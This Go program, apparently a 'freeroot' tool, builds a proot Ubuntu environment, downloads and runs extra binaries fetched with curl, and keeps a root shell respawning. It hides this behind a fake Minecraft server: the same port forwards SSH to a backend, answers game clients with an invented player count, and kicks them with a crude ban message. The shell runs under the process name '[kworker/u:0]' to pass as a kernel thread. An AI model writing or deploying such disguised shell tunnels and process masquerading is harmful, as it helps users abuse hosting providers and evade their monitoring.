// Cooked by mytai
package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var urls = []string{
	"https://github.com/Mytai20100/freeroot.git",
	"https://github.servernotdie.workers.dev/Mytai20100/freeroot.git",
	"https://gitlab.com/Mytai20100/freeroot.git",
	"https://gitlab.snd.qzz.io/mytai20100/freeroot.git",
	"https://git.snd.qzz.io/mytai20100/freeroot.git",
}

var extraBins = [][2]string{
	{"cryruss-amd64", "https://github.com/Mytai20100/cryruss/releases/download/v0.0.4/cryruss-amd64"},
	{"cryruss-arm64", "https://github.com/Mytai20100/cryruss/releases/download/v0.0.4/cryruss-arm64"},
	{"journalctl-amd64", "https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/journalctl-amd64"},
	{"journalctl-arm64", "https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/journalctl-arm64"},
	{"systemctl-amd64", "https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/systemctl-amd64"},
	{"systemctl-arm64", "https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/systemctl-arm64"},
}

const (
	tmpDir = "freeroot_temp"
	dir    = "work"
	sh     = "noninteractive.sh"
)

var (
	sshIp          = "0.0.0.0"
	proxyPort      = 2222
	sshBackendPort = 2223
	running        = true
	playerCount    atomic.Int64
	users          sync.Map
)

func logInfo(msg string)   { log.Println("[INFO]", msg) }
func logWarn(msg string)   { log.Println("[WARN]", msg) }
func logSevere(msg string) { log.Println("[SEVERE]", msg) }

func getArchSuffix() string {
	arch := runtime.GOARCH
	switch arch {
	case "arm64":
		return "arm64"
	case "arm":
		return "armv7"
	}
	return "amd64"
}

func getArchSuffixFull() string {
	arch := runtime.GOARCH
	switch arch {
	case "arm64":
		return "aarch64"
	case "arm":
		return "armv7"
	case "amd64":
		return "x86_64"
	}
	return "x86_64"
}

func loadConfig() {
	users.Store("root", "root")
	cfg := "server.properties"
	f, err := os.Open(cfg)
	if err != nil {
		logInfo("[*] No server.properties found, using defaults")
		applyDefaults()
		return
	}
	defer f.Close()
	props := map[string]string{}
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		idx := strings.Index(line, "=")
		if idx != -1 {
			props[strings.TrimSpace(line[:idx])] = strings.TrimSpace(line[idx+1:])
		}
	}
	ip := props["server-ip"]
	if ip == "" {
		ip = "0.0.0.0"
	}
	sshIp = ip
	if p, err2 := strconv.Atoi(props["server-port"]); err2 == nil && p > 0 {
		proxyPort = p
	} else {
		proxyPort = 2222
	}
	sshBackendPort = proxyPort + 1
	logInfo(fmt.Sprintf("[+] Config loaded: proxy=%s:%d | ssh_backend=127.0.0.1:%d", sshIp, proxyPort, sshBackendPort))
}

func applyDefaults() {
	sshIp = "0.0.0.0"
	proxyPort = 2222
	sshBackendPort = 2223
}

func isPortAvailable(port int) bool {
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return false
	}
	ln.Close()
	return true
}

func cmdExists(c string) bool {
	cmd := exec.Command(c, "--version")
	cmd.Stdout = io.Discard
	cmd.Stderr = io.Discard
	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return false
	}
	go func() { done <- cmd.Wait() }()
	select {
	case err := <-done:
		return err == nil
	case <-time.After(3 * time.Second):
		cmd.Process.Kill()
		return false
	}
}

func delPath(p string) {
	if _, err := os.Stat(p); os.IsNotExist(err) {
		return
	}
	if err := exec.Command("rm", "-rf", p).Run(); err != nil {
		logWarn("Delete failed: " + p + " " + err.Error())
	}
}

func cleanPath(d string) {
	if d != "" {
		delPath(d)
	}
}

func cloneRepo() bool {
	for i, url := range urls {
		logInfo(fmt.Sprintf("[*] Trying clone: %s (%d/%d)", url, i+1, len(urls)))
		cmd := exec.Command("git", "clone", "--depth=1", url, tmpDir)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err == nil {
			logInfo("[+] Cloned: " + url)
			return true
		} else {
			logWarn("Clone failed from " + url)
			delPath(tmpDir)
		}
	}
	return false
}

func readVarInt(r io.Reader) (int, error) {
	value := 0
	position := 0
	for {
		buf := make([]byte, 1)
		if _, err := io.ReadFull(r, buf); err != nil {
			return 0, err
		}
		b := buf[0]
		value |= int(b&0x7F) << position
		if b&0x80 == 0 {
			break
		}
		position += 7
		if position >= 32 {
			return 0, fmt.Errorf("VarInt too big")
		}
	}
	return value, nil
}

func writeVarInt(value int) []byte {
	var buf []byte
	for {
		if value&^0x7F == 0 {
			buf = append(buf, byte(value))
			return buf
		}
		buf = append(buf, byte(value&0x7F)|0x80)
		value >>= 7
	}
}

func readMCString(r io.Reader) (string, error) {
	length, err := readVarInt(r)
	if err != nil {
		return "", err
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(r, buf); err != nil {
		return "", err
	}
	return string(buf), nil
}

func writeMCString(s string) []byte {
	sb := []byte(s)
	return append(writeVarInt(len(sb)), sb...)
}

func writeVarIntPacket(packetId int, payload string) []byte {
	idBuf := writeVarInt(packetId)
	strBuf := writeMCString(payload)
	data := append(idBuf, strBuf...)
	lenBuf := writeVarInt(len(data))
	return append(lenBuf, data...)
}

func buildStatusJson(protocolVersion int) string {
	type version struct {
		Name     string `json:"name"`
		Protocol int    `json:"protocol"`
	}
	type players struct {
		Max    int           `json:"max"`
		Online int64         `json:"online"`
		Sample []interface{} `json:"sample"`
	}
	type description struct {
		Text string `json:"text"`
	}
	type status struct {
		Version            version     `json:"version"`
		Players            players     `json:"players"`
		Description        description `json:"description"`
		EnforcesSecureChat bool        `json:"enforcesSecureChat"`
		PreviewsChat       bool        `json:"previewsChat"`
	}
	s := status{
		Version:     version{Name: "1.21.8", Protocol: protocolVersion},
		Players:     players{Max: 219999, Online: playerCount.Load(), Sample: []interface{}{}},
		Description: description{Text: "A Minecraft Server\nPaper 1.21.8"},
	}
	b, _ := json.Marshal(s)
	return string(b)
}

func buildKickMessage() string {
	type extra struct {
		Text   string `json:"text"`
		Color  string `json:"color,omitempty"`
		Bold   bool   `json:"bold,omitempty"`
		Italic bool   `json:"italic,omitempty"`
	}
	type kick struct {
		Text  string  `json:"text"`
		Extra []extra `json:"extra"`
	}
	k := kick{
		Text: "",
		Extra: []extra{
			{Text: "You are banned from this server\n\n", Color: "red", Bold: true},
			{Text: "Reason: ", Color: "gray"},
			{Text: "You wanna fuck dinosakura?\n", Color: "yellow"},
			{Text: "Banned by: ", Color: "gray"},
			{Text: "Console\n", Color: "aqua"},
			{Text: "Unban date: ", Color: "gray"},
			{Text: "Never\n\n", Color: "dark_red"},
			{Text: "Appeals are not available.", Color: "dark_gray", Italic: true},
		},
	}
	b, _ := json.Marshal(k)
	return string(b)
}

func handleMinecraftInline(conn net.Conn, peeked []byte) {
	defer func() {
		time.Sleep(200 * time.Millisecond)
		conn.Close()
	}()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	allBuf := bytes.NewBuffer(peeked)
	extraCh := make(chan []byte, 64)
	go func() {
		tmp := make([]byte, 4096)
		for {
			n, err := conn.Read(tmp)
			if n > 0 {
				cp := make([]byte, n)
				copy(cp, tmp[:n])
				extraCh <- cp
			}
			if err != nil {
				close(extraCh)
				return
			}
		}
	}()

	drain := func(needed int) {
		for allBuf.Len() < needed {
			select {
			case chunk, ok := <-extraCh:
				if !ok {
					return
				}
				allBuf.Write(chunk)
			case <-time.After(3 * time.Second):
				return
			}
		}
	}

	waitAndRead := func(r io.Reader) io.Reader {
		return r
	}
	_ = waitAndRead

	r := allBuf

	drain(10)
	if _, err := readVarInt(r); err != nil {
		return
	}
	pktId, err := readVarInt(r)
	if err != nil || pktId != 0x00 {
		return
	}
	protocolVersion, err := readVarInt(r)
	if err != nil {
		return
	}
	if _, err := readMCString(r); err != nil {
		return
	}
	portBuf := make([]byte, 2)
	if _, err := io.ReadFull(r, portBuf); err != nil {
		return
	}
	nextState, err := readVarInt(r)
	if err != nil {
		return
	}

	if nextState == 1 {
		drain(4)
		if _, err := readVarInt(r); err != nil {
			return
		}
		reqId, err := readVarInt(r)
		if err != nil || reqId != 0x00 {
			return
		}
		statusPkt := writeVarIntPacket(0x00, buildStatusJson(protocolVersion))
		conn.Write(statusPkt)

		drain(13)
		if _, err := readVarInt(r); err != nil {
			return
		}
		pingId, err := readVarInt(r)
		if err != nil {
			return
		}
		if pingId == 0x01 {
			payloadBuf := make([]byte, 8)
			if _, err := io.ReadFull(r, payloadBuf); err == nil {
				pongId := writeVarInt(0x01)
				pongData := append(pongId, payloadBuf...)
				pongLen := writeVarInt(len(pongData))
				conn.Write(append(pongLen, pongData...))
			}
		}

	} else if nextState == 2 {
		time.Sleep(100 * time.Millisecond)
		kickPkt := writeVarIntPacket(0x00, buildKickMessage())
		conn.Write(kickPkt)
		time.Sleep(100 * time.Millisecond)
	}
}

func pipeConns(src, dst net.Conn) {
	defer src.Close()
	defer dst.Close()
	io.Copy(dst, src)
}

func routeConnection(client net.Conn) {
	client.SetDeadline(time.Now().Add(5 * time.Second))
	peek := make([]byte, 9)
	n, err := client.Read(peek)
	client.SetDeadline(time.Time{})

	if err != nil || n <= 0 {
		client.Close()
		return
	}
	peek = peek[:n]

	isSSH := n >= 4 && peek[0] == 0x53 && peek[1] == 0x53 && peek[2] == 0x48 && peek[3] == 0x2D
	if isSSH {
		backend, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", sshBackendPort))
		if err != nil {
			logWarn("[!] SSH backend unreachable: " + err.Error())
			client.Close()
			return
		}
		if tc, ok := client.(*net.TCPConn); ok {
			tc.SetNoDelay(true)
		}
		if tc, ok := backend.(*net.TCPConn); ok {
			tc.SetNoDelay(true)
		}
		backend.Write(peek)
		go pipeConns(client, backend)
		go pipeConns(backend, client)
		return
	}

	looksLikeMC := (peek[0]&0x80) == 0 && peek[0] > 0
	if looksLikeMC {
		go handleMinecraftInline(client, peek)
		return
	}

	client.Close()
}

func startProxy() {
	addr := fmt.Sprintf("%s:%d", sshIp, proxyPort)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		logSevere("Proxy failed to start: " + err.Error())
		return
	}
	logInfo(fmt.Sprintf("[+] Proxy on %s:%d (SSH→127.0.0.1:%d | MC handled inline)", sshIp, proxyPort, sshBackendPort))
	for running {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go routeConnection(conn)
	}
	ln.Close()
}

func startPlayerCountTicker() {
	playerCount.Store(int64(20500 + rand.Intn(219999-20500+1)))
	go func() {
		for running {
			time.Sleep(3 * time.Second)
			playerCount.Store(int64(20500 + rand.Intn(219999-20500+1)))
		}
	}()
}

func waitForBackendThenStartProxy() {
	logInfo(fmt.Sprintf("[*] Waiting for SSH backend on port %d...", sshBackendPort))
	go func() {
		for i := 0; i < 120; i++ {
			if !isPortAvailable(sshBackendPort) {
				logInfo("[+] SSH backend up, starting proxy")
				startPlayerCountTicker()
				go startProxy()
				return
			}
			time.Sleep(1 * time.Second)
		}
		logWarn("[!] SSH backend timeout after 120s, starting proxy anyway")
		startPlayerCountTicker()
		go startProxy()
	}()
}

func watchForInstalled() {
	go func() {
		workDir := filepath.Join(mustCwd(), "work")
		for i := 0; i < 60; i++ {
			if fileExists(workDir) && fileExists(filepath.Join(workDir, ".installed")) {
				time.Sleep(1 * time.Second)
				createSSHWrapper()
				return
			}
			time.Sleep(1 * time.Second)
		}
	}()
}

func createSSHWrapper() {
	workDir := filepath.Join(mustCwd(), "work")
	if !fileExists(workDir) {
		return
	}
	wrapper := filepath.Join(workDir, "ssh.sh")
	os.Remove(wrapper)
	script := `#!/bin/bash
set +m
export LC_ALL=C
export LANG=C
ROOTFS_DIR=$(pwd)
export PATH=$PATH:~/.local/usr/bin
export PROOT_CONFIG="$ROOTFS_DIR/usr/local/.config/proot.yml"
if [ ! -e $ROOTFS_DIR/.installed ]; then
    echo 'Proot environment not installed yet.'
    exit 1
fi
chmod -R 755 $ROOTFS_DIR/usr/local/bin/ 2>/dev/null
export TERM=${TERM:-xterm-256color}
COLS=$(tput cols 2>/dev/null || echo 80)
ROWS=$(tput lines 2>/dev/null || echo 24)
stty cols $COLS rows $ROWS 2>/dev/null
cat > $ROOTFS_DIR/root/.bashrc << 'BASHRC_EOF'
export HOSTNAME=furryisbest
export USER=furry
export TERM_PROGRAM="bash"
export PS1='root@furryisbest:\w\$ '
export LC_ALL=C
export LANG=C
export TMOUT=0
unset TMOUT
resize_term() { local sz; sz=$(stty size 2>/dev/null); [ -n "$sz" ] && stty rows ${sz%% *} cols ${sz##* } 2>/dev/null; export COLUMNS=${sz##* } LINES=${sz%% *}; }
resize_term
trap resize_term WINCH
export DEBIAN_FRONTEND=noninteractive
alias ls='ls --color=auto'
alias ll='ls -lah'
alias grep='grep --color=auto'
alias id='id 2>/dev/null'
BASHRC_EOF
stty sane 2>/dev/null
while true; do
  COLS=$(tput cols 2>/dev/null || echo 80)
  ROWS=$(tput lines 2>/dev/null || echo 24)
  DEBIAN_FRONTEND=noninteractive COLUMNS=$COLS LINES=$ROWS \
  exec -a "[kworker/u:0]" $ROOTFS_DIR/usr/local/bin/apk
  EXIT_CODE=$?
  echo 'Session ended. Restarting in 2 seconds...'
  sleep 2
done
`
	if err := os.WriteFile(wrapper, []byte(script), 0755); err != nil {
		logWarn("createSSHWrapper: " + err.Error())
	}
}

func createDefaultScript(scriptPath string) error {
	s := `#!/bin/sh
export LC_ALL=C
export LANG=C
ROOTFS_DIR=$(pwd)
export PATH=$PATH:~/.local/usr/bin
if [ ! -e $ROOTFS_DIR/.installed ]; then
  mkdir -p $ROOTFS_DIR/usr/local/bin
  chmod 755 $ROOTFS_DIR/usr/local/bin/apk
  printf 'nameserver 1.1.1.1\n' > ${ROOTFS_DIR}/etc/resolv.conf
  touch $ROOTFS_DIR/.installed
fi
$ROOTFS_DIR/usr/local/bin/apk --rootfs="${ROOTFS_DIR}" -0 -w "/root" -b /dev -b /sys -b /proc -b /etc/resolv.conf -b $ROOTFS_DIR/usr/local/bin:/usr/local/bin --kill-on-exit /bin/bash -i
`
	return os.WriteFile(scriptPath, []byte(s), 0755)
}

func extractTarXz(tarPath, destDir string) error {
	if err := os.MkdirAll(destDir, 0755); err != nil {
		return err
	}
	return exec.Command("tar", "-xJf", tarPath, "-C", destDir).Run()
}

func extractBinFromTarXz(tarPath, destDir, destName string) string {
	destFile := filepath.Join(destDir, destName)
	tmpExtract := filepath.Join(os.TempDir(), fmt.Sprintf("bin_extract_%s_%d", destName, time.Now().UnixNano()))
	delPath(tmpExtract)
	os.MkdirAll(tmpExtract, 0755)
	if err := extractTarXz(tarPath, tmpExtract); err != nil {
		logWarn(fmt.Sprintf("extractBinFromTarXz [%s]: %v", tarPath, err))
	} else {
		entries, _ := os.ReadDir(tmpExtract)
		for _, e := range entries {
			if !e.IsDir() {
				os.MkdirAll(destDir, 0755)
				src := filepath.Join(tmpExtract, e.Name())
				data, err := os.ReadFile(src)
				if err == nil {
					os.WriteFile(destFile, data, 0755)
				}
				break
			}
		}
	}
	delPath(tmpExtract)
	if fileExists(destFile) {
		os.Chmod(destFile, 0755)
		exec.Command("chmod", "755", destFile).Run()
	}
	return destFile
}

func installBins(workDir string) {
	suffix := getArchSuffix()
	binDir := filepath.Join(workDir, "usr/local/bin")
	os.MkdirAll(binDir, 0755)

	targets := [][2]string{
		{"cryruss", "cryruss-" + suffix},
		{"journalctl", "journalctl-" + suffix},
		{"systemctl", "systemctl-" + suffix},
	}

	for _, t := range targets {
		name, resourceName := t[0], t[1]
		destFile := filepath.Join(binDir, name)
		if fileExists(destFile) {
			if err := isExecutable(destFile); err == nil {
				continue
			}
		}
		tarPath := filepath.Join(mustCwd(), resourceName+".tar.xz")
		result := extractBinFromTarXz(tarPath, binDir, name)
		if !fileExists(result) {
			for _, dep := range extraBins {
				if dep[0] == resourceName {
					logInfo("[*] Downloading " + resourceName + "...")
					if err := exec.Command("curl", "-fsSL", "-o", destFile, dep[1]).Run(); err != nil {
						logWarn("Failed to download " + resourceName + ": " + err.Error())
					} else {
						os.Chmod(destFile, 0755)
						exec.Command("chmod", "755", destFile).Run()
					}
					break
				}
			}
		}
		if fileExists(destFile) {
			logInfo("[+] Ready: " + destFile)
		} else {
			logWarn("[!] Binary missing: " + name)
		}
	}
}

func fallbackLocal() bool {
	logInfo("[*] Local resources fallback...")
	w := filepath.Join(mustCwd(), dir)
	os.MkdirAll(w, 0755)

	archSuffix := getArchSuffixFull()
	binSuffix := getArchSuffix()

	archAlt := "amd64"
	switch archSuffix {
	case "aarch64":
		archAlt = "arm64"
	case "armv6":
		archAlt = "armv6"
	case "armv7":
		archAlt = "armv7"
	}

	supported := map[string]bool{"x86_64": true, "aarch64": true, "armv6": true, "armv7": true}
	if !supported[archSuffix] {
		logSevere("Unsupported arch: " + runtime.GOARCH)
		return false
	}

	binDir := filepath.Join(w, "usr/local/bin")
	os.MkdirAll(binDir, 0755)

	prootTar := filepath.Join(mustCwd(), "proot-"+archSuffix+".tar.xz")
	prootBin := extractBinFromTarXz(prootTar, binDir, "proot")
	if !fileExists(prootBin) {
		logSevere("proot not extracted")
		return false
	}

	busyboxTar := filepath.Join(mustCwd(), "busybox-"+archSuffix+".tar.xz")
	extractBinFromTarXz(busyboxTar, w, "busybox-"+archSuffix)

	localBins := [][2]string{
		{"cryruss", "cryruss-" + binSuffix},
		{"journalctl", "journalctl-" + binSuffix},
		{"systemctl", "systemctl-" + binSuffix},
	}

	for _, lb := range localBins {
		name, resourceName := lb[0], lb[1]
		destBin := filepath.Join(binDir, name)
		if fileExists(destBin) {
			if err := isExecutable(destBin); err == nil {
				continue
			}
		}
		tarPath := filepath.Join(mustCwd(), resourceName+".tar.xz")
		result := extractBinFromTarXz(tarPath, binDir, name)
		if !fileExists(result) {
			for _, dep := range extraBins {
				if dep[0] == resourceName {
					if err := exec.Command("curl", "-fsSL", "-o", destBin, dep[1]).Run(); err != nil {
						logWarn("Failed to download " + resourceName + ": " + err.Error())
					} else {
						os.Chmod(destBin, 0755)
						exec.Command("chmod", "755", destBin).Run()
					}
					break
				}
			}
		}
		if fileExists(destBin) {
			logInfo("[+] Ready: " + name)
		}
	}

	ubuntuTar := filepath.Join(mustCwd(), fmt.Sprintf("ubuntu-base-22.04.5-base-%s.tar.xz", archAlt))
	if err := extractTarXz(ubuntuTar, w); err != nil {
		logWarn("ubuntu tar extract: " + err.Error())
	}

	scriptPath := filepath.Join(w, sh)
	embeddedScript := filepath.Join(mustCwd(), "META-INF", "noninteractive.sh")
	if fileExists(embeddedScript) {
		data, err := os.ReadFile(embeddedScript)
		if err == nil {
			os.WriteFile(scriptPath, data, 0755)
		} else {
			createDefaultScript(scriptPath)
		}
	} else {
		createDefaultScript(scriptPath)
	}

	logInfo("[+] Local fallback done")
	return true
}

func execScript(workDir, scriptName string) {
	logInfo("[*] Executing noninteractive.sh...")
	installedMarker := filepath.Join(workDir, ".installed")

	if !fileExists(installedMarker) {
		cmd := exec.Command("bash", scriptName)
		cmd.Dir = workDir
		cmd.Stdin = nil
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Start()

		done := false
		var mu sync.Mutex
		for i := 0; i < 300; i++ {
			time.Sleep(1 * time.Second)
			if fileExists(installedMarker) {
				mu.Lock()
				if !done {
					done = true
					cmd.Process.Kill()
				}
				mu.Unlock()
				break
			}
		}
		mu.Lock()
		if !done {
			done = true
			cmd.Process.Kill()
		}
		mu.Unlock()
		cmd.Wait()
	}

	afterInstall(workDir, scriptName)
}

func afterInstall(workDir, scriptName string) {
	if !fileExists(filepath.Join(workDir, ".installed")) {
		logSevere("[!] .installed not found, abort.")
		return
	}

	installBins(workDir)
	exec.Command("chmod", "-R", "755", filepath.Join(workDir, "usr/local/bin")).Run()
	createSSHWrapper()

	env := os.Environ()
	term := os.Getenv("TERM")
	if term == "" {
		term = "xterm-256color"
	}
	env = setEnv(env, "TERM", term)
	env = setEnv(env, "LC_ALL", "C")
	env = setEnv(env, "LANG", "C")
	env = setEnv(env, "TMOUT", "0")

	scriptPath := filepath.Join(workDir, scriptName)
	for running {
		cmd := exec.Command("bash", scriptPath)
		cmd.Dir = workDir
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Stdin = os.Stdin
		cmd.Env = env
		if err := cmd.Run(); err != nil {
			logInfo("[*] Session exited (" + err.Error() + "), restarting in 2s...")
		} else {
			logInfo("[*] Session exited (0), restarting in 2s...")
		}
		time.Sleep(2 * time.Second)
	}
}

func runAfterFallback() {
	wf := filepath.Join(mustCwd(), dir)
	sf := filepath.Join(wf, sh)
	if fileExists(sf) {
		os.Chmod(sf, 0755)
		execScript(wf, sh)
	} else {
		logWarn("[!] Fallback did not create work dir")
	}
}

func setEnv(env []string, key, val string) []string {
	prefix := key + "="
	for i, e := range env {
		if strings.HasPrefix(e, prefix) {
			env[i] = prefix + val
			return env
		}
	}
	return append(env, prefix+val)
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

func isExecutable(p string) error {
	info, err := os.Stat(p)
	if err != nil {
		return err
	}
	if info.Mode()&0111 != 0 {
		return nil
	}
	return fmt.Errorf("not executable")
}

func mustCwd() string {
	cwd, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	return cwd
}

func main() {
	args := os.Args[1:]
	noNet := false

	for _, arg := range args {
		if arg == "--help" || arg == "help" {
			fmt.Println("Usage: ./main [options]")
			fmt.Println("  --help    Show this help")
			fmt.Println("  --nonet   Use embedded resources, skip git clone")
			return
		}
		if arg == "--nonet" {
			noNet = true
			logInfo("[*] --nonet mode: using embedded resources")
		}
	}

	rand.Seed(time.Now().UnixNano())
	loadConfig()
	waitForBackendThenStartProxy()
	watchForInstalled()

	if !cmdExists("bash") {
		logSevere("Bash not found")
		os.Exit(1)
	}

	w := filepath.Join(mustCwd(), dir)
	if fileExists(w) {
		logInfo("[*] 'work' exists, checking...")
		s := filepath.Join(w, sh)
		if fileExists(s) {
			logInfo("[+] Valid repo found, skipping clone")
			os.Chmod(s, 0755)
			execScript(w, sh)
			return
		}
		logWarn("Invalid repo, removing...")
		delPath(w)
	}

	t := filepath.Join(mustCwd(), tmpDir)
	delPath(t)

	if noNet {
		logInfo("[*] --nonet: skipping clone, using embedded resources")
		if !fallbackLocal() {
			logSevere("Fallback failed")
			os.Exit(1)
		}
		runAfterFallback()
		return
	}

	if !cmdExists("git") {
		logWarn("Git not found, using fallback")
		if !fallbackLocal() {
			logSevere("Fallback failed")
			os.Exit(1)
		}
		runAfterFallback()
		return
	}

	if !cloneRepo() {
		logWarn("All clones failed, trying fallback...")
		cleanPath(t)
		if !fallbackLocal() {
			logSevere("Fallback failed")
			os.Exit(1)
		}
		runAfterFallback()
		return
	}

	if err := os.Rename(t, w); err != nil {
		logSevere("Rename failed")
		cleanPath(t)
		os.Exit(1)
	}
	logInfo("[+] Renamed to 'work'")

	s := filepath.Join(w, sh)
	if !fileExists(s) {
		logSevere("Script not found")
		cleanPath(w)
		os.Exit(1)
	}
	os.Chmod(s, 0755)
	execScript(w, sh)
	logInfo("[+] Freeroot")

	_ = binary.BigEndian
}